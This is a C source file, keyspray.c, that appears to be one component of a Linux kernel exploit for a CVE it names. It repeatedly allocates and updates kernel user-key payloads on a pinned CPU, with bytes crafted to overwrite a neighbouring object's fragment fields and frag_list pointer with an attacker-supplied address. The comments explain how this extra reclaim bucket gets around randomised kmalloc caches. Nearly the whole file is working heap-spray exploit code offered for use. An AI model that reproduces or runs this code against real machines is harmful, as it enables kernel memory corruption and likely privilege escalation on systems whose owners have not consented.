/* keyspray.c <cpu> <S> [nkeys] [payload_len]
 *
 * Second reclaim bucket for CVE-2026-98432: user_key_payload (kmalloc-96).
 * Layout: rcu (0..15), datalen (16..17), data (24..).  So:
 *   data[0]      -> object+24  = opt->optlen   (we set 200)
 *   data[58/59]  -> neighbour+82/83 = nr_frags/tx_flags
 *   data[64..71] -> neighbour+88..95 = frag_list = S
 * The allocation call site is user_preparse, a DIFFERENT random-kmalloc
 * bucket than saved_syn / the victim.  Adding such buckets removes the
 * dependence on the target's per-boot kmalloc seed.
 *
 * Pinned to <cpu>; churns KEYCTL_UPDATE so payloads are continuously
 * allocated/freed on the victim CPU.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_add_key
#define __NR_add_key 248
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 250
#endif
#define KEY_SPEC_PROCESS_KEYRING (-2)
#define KEYCTL_UPDATE 2

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <cpu> <S> [nkeys] [plen]\n", argv[0]);
        return 1;
    }
    int cpu = atoi(argv[1]);
    unsigned long long S = strtoull(argv[2], NULL, 0);
    int n = argc > 3 ? atoi(argv[3]) : 200;
    int plen = argc > 4 ? atoi(argv[4]) : 72;
    if (plen < 72) plen = 72;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);

    unsigned char p[256];
    memset(p, 0, sizeof(p));
    p[0] = 160;                 /* optlen at object+24: covers frag_list
                                 * (shinfo+8, source offset 152) but stops
                                 * before destructor_arg (offset 184) */
    p[56] = 0;                  /* neighbour+80/81: shinfo flags/meta_len */
    p[57] = 0;
    p[58] = 0;                  /* neighbour+82: nr_frags */
    p[59] = 0;                  /* neighbour+83: tx_flags */
    memcpy(p + 64, &S, 8);      /* neighbour+88..95: frag_list */
    fprintf(stderr, "keyspray cpu=%d S=%#llx n=%d plen=%d\n", cpu, S, n, plen);

    int keys[4096];
    int made = 0;
    for (int i = 0; i < n && i < 4096; i++) {
        char d[32];
        snprintf(d, sizeof(d), "cve%d", i);
        long k = syscall(__NR_add_key, "user", d, p, (size_t)plen,
                         KEY_SPEC_PROCESS_KEYRING);
        if (k < 0) {
            fprintf(stderr, "add_key[%d] failed: %s\n", i, strerror(errno));
            break;
        }
        keys[made++] = (int)k;
    }
    fprintf(stderr, "made=%d\n", made);
    unsigned long it = 0;
    for (;;) {
        for (int i = 0; i < made; i++)
            syscall(__NR_keyctl, KEYCTL_UPDATE, keys[i], p, (size_t)plen);
        it++;
        if ((it & 0x3ff) == 0)
            fprintf(stderr, "updates=%lu\n", it * (unsigned long)made);
    }
}
